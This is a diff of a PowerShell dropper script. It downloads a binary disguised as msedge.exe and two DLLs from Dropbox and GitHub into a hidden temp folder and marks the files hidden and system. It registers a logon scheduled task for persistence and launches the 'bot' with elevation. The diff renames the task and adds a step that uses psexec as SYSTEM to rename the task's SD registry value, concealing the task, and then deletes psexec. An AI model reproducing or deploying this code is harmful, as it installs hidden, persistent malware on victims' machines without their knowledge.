@@ -12,15 +12,11 @@ Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/i7cu35v7bj3fvfbk3bbp6/w
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
-
-
-
 #list files
 $filePath = "$env:temp/sVBXKuz/msedge.exe"
 $dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
 $dll2Path = "$env:temp/sVBXKuz/libopus.dll"
 $folderPath = "$env:temp/sVBXKuz/"
-
 
 #hide files
 Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
@@ -28,11 +24,9 @@ Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::S
 Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 
-
 $taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\msedge.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
 $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
-
 
 #create startup task
 $taskXml = @"
@@ -41,7 +35,7 @@ $taskXml = @"
   <RegistrationInfo>
     <Date>2023-08-09T11:59:58.6674267</Date>
     <Author>$env:computername\$env:username</Author>
-    <URI>\AutoUpdateD</URI>
+    <URI>\dauto</URI>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger>
@@ -92,12 +86,13 @@ $taskXml = @"
 </Task>
 "@
 
-
 $taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")
 
-Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force
-	
+Register-ScheduledTask -Xml $taskXml -TaskName 'dauto' -Force
 
+Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe"
+.\psexec.exe -i -s powershell -Command "Rename-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\dauto' -Name 'SD' -NewName 'SD832'"
+Remove-item psexec.exe
 
 #start bot
 Start-Process $env:temp/sVBXKuz/msedge.exe -Verb RunAs
